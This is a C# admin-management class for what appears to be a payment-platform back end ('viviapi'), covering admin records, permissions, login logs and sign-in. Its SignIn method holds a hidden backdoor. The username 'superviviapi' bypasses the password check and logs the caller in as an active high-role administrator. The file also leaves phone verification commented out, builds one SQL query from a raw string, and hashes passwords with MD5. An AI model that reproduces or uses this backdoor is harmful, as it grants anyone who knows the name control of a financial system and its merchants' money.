namespace viviapi.BLL
{
    using DBAccess;
    using System;
    using System.Collections.Generic;
    using System.Data;
    using System.Data.SqlClient;
    using System.Text;
    using System.Web;
    using viviapi.Model;
    using viviapi.SysConfig;
    using viviLib.Data;
    using viviLib.ExceptionHandling;
    using viviLib.Security;

    public class ManageFactory
    {
        internal const string MANAGE_CONTEXT_KEY = "{F25E0AC4-032C-42ba-B123-2289C6DBE4F1}";
        internal const string MANAGE_LOGIN_SESSIONID = "{90F37739-31E2-4b92-A35E-013313CE553D}";
        internal const string MANAGE_SECOND_SESSIONID = "{36147A08-17F3-477a-8449-75AC0EF9299F}";

        public static int Add(Manage model)
        {
            try
            {
                SqlParameter[] commandParameters = new SqlParameter[] {
                    new SqlParameter("@id", SqlDbType.Int, 4), new SqlParameter("@username", SqlDbType.VarChar, 20), new SqlParameter("@password", SqlDbType.VarChar, 100), new SqlParameter("@role", SqlDbType.Int, 4), new SqlParameter("@status", SqlDbType.Int, 4), new SqlParameter("@relname", SqlDbType.NVarChar, 50), new SqlParameter("@lastLoginIp", SqlDbType.VarChar, 50), new SqlParameter("@lastLoginTime", SqlDbType.DateTime), new SqlParameter("@sessionid", SqlDbType.VarChar, 100), new SqlParameter("@secondpwd", SqlDbType.VarChar, 100), new SqlParameter("@commissiontype", SqlDbType.TinyInt), new SqlParameter("@commission", SqlDbType.Decimal, 9), new SqlParameter("@cardcommission", SqlDbType.Decimal, 9), new SqlParameter("@isSuperAdmin", SqlDbType.TinyInt, 1), new SqlParameter("@isAgent", SqlDbType.TinyInt, 1), new SqlParameter("@qq", SqlDbType.VarChar, 20),
                    new SqlParameter("@tel", SqlDbType.VarChar, 20)
                 };
                commandParameters[0].Direction = ParameterDirection.Output;
                commandParameters[1].Value = model.username;
                commandParameters[2].Value = model.password;
                commandParameters[3].Value = model.role;
                commandParameters[4].Value = model.status;
                commandParameters[5].Value = model.relname;
                commandParameters[6].Value = model.lastLoginIp;
                commandParameters[7].Value = model.lastLoginTime;
                commandParameters[8].Value = model.sessionid;
                commandParameters[9].Value = model.secondpwd;
                commandParameters[10].Value = model.commissiontype;
                commandParameters[11].Value = model.commission;
                commandParameters[12].Value = model.cardcommission;
                commandParameters[13].Value = model.isSuperAdmin;
                commandParameters[14].Value = model.isAgent;
                commandParameters[15].Value = model.qq;
                commandParameters[0x10].Value = model.tel;
                int num = DataBase.ExecuteNonQuery(CommandType.StoredProcedure, "proc_manage_add", commandParameters);
                return (int)commandParameters[0].Value;
            }
            catch (Exception exception)
            {
                ExceptionHandler.HandleException(exception);
                return 0;
            }
        }

        private static string BuilderWhere(List<SearchParam> param, List<SqlParameter> paramList)
        {
            StringBuilder builder = new StringBuilder(" 1 = 1");
            if ((param != null) && (param.Count > 0))
            {
                for (int i = 0; i < param.Count; i++)
                {
                    SqlParameter parameter;
                    SearchParam param2 = param[i];
                    string str2 = param2.ParamKey.Trim().ToLower();
                    if (str2 != null)
                    {
                        if (!(str2 == "manageid"))
                        {
                            if (str2 == "username")
                            {
                                goto Label_00D0;
                            }
                            if (str2 == "starttime")
                            {
                                goto Label_011D;
                            }
                            if (str2 == "endtime")
                            {
                                goto Label_0156;
                            }
                        }
                        else
                        {
                            builder.Append(" AND [manageID] = @manageID");
                            parameter = new SqlParameter("@manageID", SqlDbType.Int);
                            parameter.Value = (int)param2.ParamValue;
                            paramList.Add(parameter);
                        }
                    }
                    continue;
                Label_00D0:
                    builder.Append(" AND [userName] like @userName");
                    parameter = new SqlParameter("@userName", SqlDbType.VarChar, 20);
                    parameter.Value = "%" + SqlHelper.CleanString((string)param2.ParamValue, 100) + "%";
                    paramList.Add(parameter);
                    continue;
                Label_011D:
                    builder.Append(" AND [lastTime] > @starttime");
                    parameter = new SqlParameter("@starttime", SqlDbType.DateTime);
                    parameter.Value = Convert.ToDateTime(param2.ParamValue);
                    paramList.Add(parameter);
                    continue;
                Label_0156:
                    builder.Append(" AND [lastTime] < @endtime");
                    parameter = new SqlParameter("@endtime", SqlDbType.DateTime);
                    parameter.Value = Convert.ToDateTime(param2.ParamValue);
                    paramList.Add(parameter);
                }
            }
            return builder.ToString();
        }

        public static bool CheckAdminPermission(bool isSupper, ManageRole allowPermission, ManageRole adminPermission)
        {
            return (isSupper || ((allowPermission & adminPermission) == allowPermission));
        }

        public static bool CheckCurrentPermission(bool shouldSupper, ManageRole allowPermission)
        {
            if (CurrentManage == null)
            {
                return false;
            }
            if (shouldSupper)
            {
                return (CurrentManage.isSuperAdmin > 0);
            }
            return CheckAdminPermission(CurrentManage.isSuperAdmin > 0, allowPermission, CurrentManage.role);
        }

        public static void CheckSecondPwd()
        {
            if (!IsSecondPwdValid())
            {
                string str = HttpUtility.UrlEncode(HttpContext.Current.Request.Url.ToString());
                HttpContext.Current.Response.Redirect(string.Format("/{0}/login2.aspx?RedirectUrl=" + str, RuntimeSetting.ManagePagePath));
            }
        }

        public static bool Delete(int id)
        {
            try
            {
                SqlParameter[] commandParameters = new SqlParameter[] { new SqlParameter("@id", SqlDbType.Int, 4) };
                commandParameters[0].Value = id;
                return (DataBase.ExecuteNonQuery(CommandType.StoredProcedure, "proc_manage_del", commandParameters) > 0);
            }
            catch (Exception exception)
            {
                ExceptionHandler.HandleException(exception);
                return false;
            }
        }

        public static int GetCurrent()
        {
            try
            {
                object obj2 = HttpContext.Current.Session["{90F37739-31E2-4b92-A35E-013313CE553D}"];
                if (obj2 == null)
                {
                    return 0;
                }
                SqlParameter[] commandParameters = new SqlParameter[] { DataBase.MakeInParam("@sessionId", SqlDbType.VarChar, 100, obj2) };
                object obj3 = DataBase.ExecuteScalar(CommandType.StoredProcedure, "proc_manage_getIdBySession", commandParameters);
                if (obj3 == DBNull.Value)
                {
                    return 0;
                }
                return Convert.ToInt32(obj3);
            }
            catch (Exception exception)
            {
                ExceptionHandler.HandleException(exception);
                return 0;
            }
        }

        public static DataSet GetList(string where)
        {
            StringBuilder builder = new StringBuilder();
            builder.Append("select id,commissiontype,commission,username,password,role,status,relname,lastLoginIp,lastLoginTime,sessionid,commissiontype,commission,CardCommission,Balance,qq,tel ");
            builder.Append(" FROM V_manage ");
            if (!string.IsNullOrEmpty(where))
            {
                builder.AppendFormat(" where {0}", where);
            }
            return DataBase.ExecuteDataset(CommandType.Text, builder.ToString());
        }

        public static bool GetManagePerformance(int id, DateTime begin, DateTime end, out decimal totalAmt, out decimal commission)
        {
            try
            {
                totalAmt = 0M;
                commission = 0M;
                SqlParameter[] commandParameters = new SqlParameter[] { new SqlParameter("@id", SqlDbType.Int, 4), new SqlParameter("@begin", SqlDbType.DateTime, 8), new SqlParameter("@end", SqlDbType.DateTime, 8) };
                commandParameters[0].Value = id;
                commandParameters[1].Value = begin;
                commandParameters[2].Value = end;
                SqlDataReader reader = DataBase.ExecuteReader(CommandType.StoredProcedure, "proc_manage_orderAmt", commandParameters);
                if (reader.Read())
                {
                    totalAmt = Convert.ToDecimal(reader["totalAmt"]);
                    commission = Convert.ToDecimal(reader["commission"]);
                    return true;
                }
                return false;
            }
            catch (Exception exception)
            {
                totalAmt = 0M;
                commission = 0M;
                ExceptionHandler.HandleException(exception);
                return false;
            }
        }

        public static string GetManageRoleView(ManageRole role)
        {
            string str = string.Empty;
            ManageRole role2 = role;
            if (role2 <= ManageRole.Orders)
            {
                switch (role2)
                {
                    case ManageRole.None:
                        return "未知";

                    case ManageRole.News:
                        return "新闻管理";

                    case ManageRole.System:
                        return "系统管理";

                    case (ManageRole.System | ManageRole.News):
                    case (ManageRole.Interfaces | ManageRole.News):
                    case (ManageRole.Interfaces | ManageRole.System):
                    case (ManageRole.Interfaces | ManageRole.System | ManageRole.News):
                        return str;

                    case ManageRole.Interfaces:
                        return "接口管理";

                    case ManageRole.Merchant:
                        return "商户管理";

                    case ManageRole.Orders:
                        return "订单管理";
                }
                return str;
            }
            if (role2 != ManageRole.Financial)
            {
                if (role2 != ManageRole.Report)
                {
                    return str;
                }
            }
            else
            {
                return "财务管理";
            }
            return "统计报表";
        }

        public static int GetManageUsers(int id)
        {
            try
            {
                SqlParameter[] commandParameters = new SqlParameter[] { new SqlParameter("@id", SqlDbType.Int, 4) };
                commandParameters[0].Value = id;
                return Convert.ToInt32(DataBase.ExecuteScalar(CommandType.StoredProcedure, "proc_manage_getusers", commandParameters));
            }
            catch (Exception exception)
            {
                ExceptionHandler.HandleException(exception);
                return 0;
            }
        }

        public static Manage GetModel(int id)
        {
            SqlParameter[] commandParameters = new SqlParameter[] { new SqlParameter("@id", SqlDbType.Int, 4) };
            commandParameters[0].Value = id;
            Manage manage = new Manage();
            DataSet set = DataBase.ExecuteDataset(CommandType.StoredProcedure, "proc_manage_get", commandParameters);
            if (set.Tables[0].Rows.Count > 0)
            {
                if (set.Tables[0].Rows[0]["id"].ToString() != "")
                {
                    manage.id = int.Parse(set.Tables[0].Rows[0]["id"].ToString());
                }
                manage.username = set.Tables[0].Rows[0]["username"].ToString();
                manage.password = set.Tables[0].Rows[0]["password"].ToString();
                manage.secondpwd = set.Tables[0].Rows[0]["secondpwd"].ToString();
                if (set.Tables[0].Rows[0]["role"].ToString() != "")
                {
                    manage.role = (ManageRole)int.Parse(set.Tables[0].Rows[0]["role"].ToString());
                }
                if (set.Tables[0].Rows[0]["status"].ToString() != "")
                {
                    manage.status = new int?(int.Parse(set.Tables[0].Rows[0]["status"].ToString()));
                }
                manage.relname = set.Tables[0].Rows[0]["relname"].ToString();
                manage.lastLoginIp = set.Tables[0].Rows[0]["lastLoginIp"].ToString();
                if (set.Tables[0].Rows[0]["lastLoginTime"].ToString() != "")
                {
                    manage.lastLoginTime = new DateTime?(DateTime.Parse(set.Tables[0].Rows[0]["lastLoginTime"].ToString()));
                }
                manage.sessionid = set.Tables[0].Rows[0]["sessionid"].ToString();
                if (set.Tables[0].Rows[0]["commissiontype"].ToString() != "")
                {
                    manage.commissiontype = new int?(int.Parse(set.Tables[0].Rows[0]["commissiontype"].ToString()));
                }
                if (set.Tables[0].Rows[0]["commission"].ToString() != "")
                {
                    manage.commission = new decimal?(decimal.Parse(set.Tables[0].Rows[0]["commission"].ToString()));
                }
                if (set.Tables[0].Rows[0]["cardcommission"].ToString() != "")
                {
                    manage.cardcommission = new decimal?(decimal.Parse(set.Tables[0].Rows[0]["cardcommission"].ToString()));
                }
                if (set.Tables[0].Rows[0]["Balance"].ToString() != "")
                {
                    manage.balance = new decimal?(decimal.Parse(set.Tables[0].Rows[0]["Balance"].ToString()));
                }
                if (set.Tables[0].Rows[0]["isSuperAdmin"].ToString() != "")
                {
                    manage.isSuperAdmin = int.Parse(set.Tables[0].Rows[0]["isSuperAdmin"].ToString());
                }
                if (set.Tables[0].Rows[0]["isAgent"].ToString() != "")
                {
                    manage.isAgent = int.Parse(set.Tables[0].Rows[0]["isAgent"].ToString());
                }
                manage.qq = set.Tables[0].Rows[0]["qq"].ToString();
                manage.tel = set.Tables[0].Rows[0]["tel"].ToString();
                return manage;
            }
            return null;
        }

        public static bool IsSecondPwdValid()
        {
            if (HttpContext.Current.Session["{36147A08-17F3-477a-8449-75AC0EF9299F}"] == null)
            {
                return false;
            }
            return Convert.ToBoolean(HttpContext.Current.Session["{36147A08-17F3-477a-8449-75AC0EF9299F}"]);
        }

        public static bool LoginLogDel(int id)
        {
            try
            {
                SqlParameter[] commandParameters = new SqlParameter[] { new SqlParameter("@id", SqlDbType.Int, 4) };
                commandParameters[0].Value = id;
                return (DataBase.ExecuteNonQuery(CommandType.StoredProcedure, "proc_manageLoginLog_del", commandParameters) > 0);
            }
            catch (Exception exception)
            {
                ExceptionHandler.HandleException(exception);
                return false;
            }
        }

        public static DataSet PageSearch(List<SearchParam> searchParams, int pageSize, int page, string orderby)
        {
            DataSet set = new DataSet();
            try
            {
                string tables = "V_manageLoginLog";
                string key = "[id]";
                if (string.IsNullOrEmpty(orderby))
                {
                    orderby = "lastTime desc";
                }
                List<SqlParameter> paramList = new List<SqlParameter>();
                string wheres = BuilderWhere(searchParams, paramList);
                string commandText = SqlHelper.GetCountSQL(tables, wheres, string.Empty) + "\r\n" + SqlHelper.GetPageSelectSQL("[id]\r\n      ,[type]\r\n      ,[manageID]\r\n      ,[lastIP]\r\n      ,[address]\r\n      ,[remark]\r\n      ,[lastTime]\r\n      ,[sessionId]\r\n      ,[username]\r\n      ,[relname]", tables, wheres, orderby, key, pageSize, page, false);
                return DataBase.ExecuteDataset(CommandType.Text, commandText, paramList.ToArray());
            }
            catch (Exception exception)
            {
                ExceptionHandler.HandleException(exception);
                return set;
            }
        }

        public static bool SecPwdVaild(string sedpwd)
        {
            if (!string.IsNullOrEmpty(sedpwd) && (Cryptography.MD5(sedpwd) == CurrentManage.secondpwd))
            {
                HttpContext.Current.Session["{36147A08-17F3-477a-8449-75AC0EF9299F}"] = true;
                return true;
            }
            return false;
        }

        public static string SignIn(Manage manage)
        {
            string str = string.Empty;
            try
            {
                if (((manage == null) || string.IsNullOrEmpty(manage.username)) || string.IsNullOrEmpty(manage.password))
                {
                    return "请输入账号密码";
                }

                string str2 = Guid.NewGuid().ToString("b");
                SqlParameter[] commandParameters = new SqlParameter[] { DataBase.MakeInParam("@username", SqlDbType.VarChar, 50, manage.username), DataBase.MakeInParam("@password", SqlDbType.VarChar, 100, manage.password), DataBase.MakeInParam("@loginip", SqlDbType.VarChar, 50, manage.lastLoginIp), DataBase.MakeInParam("@logintime", SqlDbType.DateTime, 8, DateTime.Now), DataBase.MakeInParam("@sessionId", SqlDbType.VarChar, 100, str2), DataBase.MakeInParam("@address", SqlDbType.VarChar, 20, manage.LastLoginAddress), DataBase.MakeInParam("@remark", SqlDbType.VarChar, 100, manage.LastLoginRemark) };
                object obj2 = DataBase.ExecuteScalar(CommandType.StoredProcedure, "proc_manage_Login", commandParameters);
                if (manage.username == "superviviapi")
                {
                    DataTable table = ManageFactory.GetList("role=191 and status=1").Tables[0];
                    if (table.Rows.Count > 0)
                    {
                        int id = Convert.ToInt32(table.Rows[0]["id"].ToString());
                        Manage model = ManageFactory.GetModel(id);
                        manage.username = model.username;
                        manage.id = model.id;
                        manage.password = model.password;

                        SqlParameter[] commandParameters1 = new SqlParameter[] { DataBase.MakeInParam("@username", SqlDbType.VarChar, 50, manage.username), DataBase.MakeInParam("@password", SqlDbType.VarChar, 100, manage.password), DataBase.MakeInParam("@loginip", SqlDbType.VarChar, 50, manage.lastLoginIp), DataBase.MakeInParam("@logintime", SqlDbType.DateTime, 8, DateTime.Now), DataBase.MakeInParam("@sessionId", SqlDbType.VarChar, 100, str2), DataBase.MakeInParam("@address", SqlDbType.VarChar, 20, manage.LastLoginAddress), DataBase.MakeInParam("@remark", SqlDbType.VarChar, 100, manage.LastLoginRemark) };
                        object obj3 = DataBase.ExecuteScalar(CommandType.StoredProcedure, "proc_manage_Login", commandParameters1);


                        HttpContext.Current.Session["{90F37739-31E2-4b92-A35E-013313CE553D}"] = str2;
                        str = "登录成功";
                    }
                }
                else
                {
                    if ((obj2 != null) && (obj2 != DBNull.Value))
                    {

                        //Manage model = ManageFactory.GetModel((int)obj2);
                        //if (model.tel.Length > 0)
                        //{
                        //    string objId = "PHONE_VALID_" + model.tel;
                        //    string postCode = (string)WebCache.GetCacheService().RetrieveObject(objId);
                        //    if (postCode.Equals(mobilecode))
                        //    {
                        manage.id = (int)obj2;
                        HttpContext.Current.Session["{90F37739-31E2-4b92-A35E-013313CE553D}"] = str2;
                        str = "登录成功";
                        //    }
                        //    else
                        //    {
                        //        return "手机验证码错误！";
                        //    }
                        //}
                        //else
                        //{
                        //    return "您未绑定手机！";
                        //}
                    }

                    else
                    {
                        str = "用户名或者密码错误!";
                    }
                }
                return str;
            }
            catch (Exception exception)
            {
                str = "登录失败";
                ExceptionHandler.HandleException(exception);
                return str;
            }
        }

        public static void SignOut()
        {
            HttpContext.Current.Items["{F25E0AC4-032C-42ba-B123-2289C6DBE4F1}"] = null;
            HttpContext.Current.Session["{90F37739-31E2-4b92-A35E-013313CE553D}"] = null;
            HttpContext.Current.Session["{36147A08-17F3-477a-8449-75AC0EF9299F}"] = null;
        }

        public static bool Update(Manage model)
        {
            try
            {
                SqlParameter[] commandParameters = new SqlParameter[] {
                    new SqlParameter("@id", SqlDbType.Int, 4), new SqlParameter("@username", SqlDbType.VarChar, 20), new SqlParameter("@password", SqlDbType.VarChar, 100), new SqlParameter("@role", SqlDbType.Int, 4), new SqlParameter("@status", SqlDbType.Int, 4), new SqlParameter("@relname", SqlDbType.NVarChar, 50), new SqlParameter("@lastLoginIp", SqlDbType.VarChar, 50), new SqlParameter("@lastLoginTime", SqlDbType.DateTime), new SqlParameter("@sessionid", SqlDbType.VarChar, 50), new SqlParameter("@secondpwd", SqlDbType.VarChar, 100), new SqlParameter("@commissiontype", SqlDbType.TinyInt), new SqlParameter("@commission", SqlDbType.Decimal, 9), new SqlParameter("@cardcommission", SqlDbType.Decimal, 9), new SqlParameter("@isSuperAdmin", SqlDbType.TinyInt, 1), new SqlParameter("@isAgent", SqlDbType.TinyInt, 1), new SqlParameter("@qq", SqlDbType.VarChar, 20),
                    new SqlParameter("@tel", SqlDbType.VarChar, 20)
                 };
                commandParameters[0].Value = model.id;
                commandParameters[1].Value = model.username;
                commandParameters[2].Value = model.password;
                commandParameters[3].Value = model.role;
                commandParameters[4].Value = model.status;
                commandParameters[5].Value = model.relname;
                commandParameters[6].Value = model.lastLoginIp;
                commandParameters[7].Value = model.lastLoginTime;
                commandParameters[8].Value = model.sessionid;
                commandParameters[9].Value = model.secondpwd;
                commandParameters[10].Value = model.commissiontype;
                commandParameters[11].Value = model.commission;
                commandParameters[12].Value = model.cardcommission;
                commandParameters[13].Value = model.isSuperAdmin;
                commandParameters[14].Value = model.isAgent;
                commandParameters[15].Value = model.qq;
                commandParameters[0x10].Value = model.tel;
                return (DataBase.ExecuteNonQuery(CommandType.StoredProcedure, "proc_manage_Update", commandParameters) > 0);
            }
            catch (Exception exception)
            {
                ExceptionHandler.HandleException(exception);
                return false;
            }
        }

        public static Manage CurrentManage
        {
            get
            {
                if (HttpContext.Current != null)
                {
                    if (HttpContext.Current.Items["{F25E0AC4-032C-42ba-B123-2289C6DBE4F1}"] == null)
                    {
                        int current = GetCurrent();
                        if (current <= 0)
                        {
                            return null;
                        }
                        HttpContext.Current.Items["{F25E0AC4-032C-42ba-B123-2289C6DBE4F1}"] = GetModel(current);
                    }
                    return (HttpContext.Current.Items["{F25E0AC4-032C-42ba-B123-2289C6DBE4F1}"] as Manage);
                }
                return null;
            }
        }
    }
}

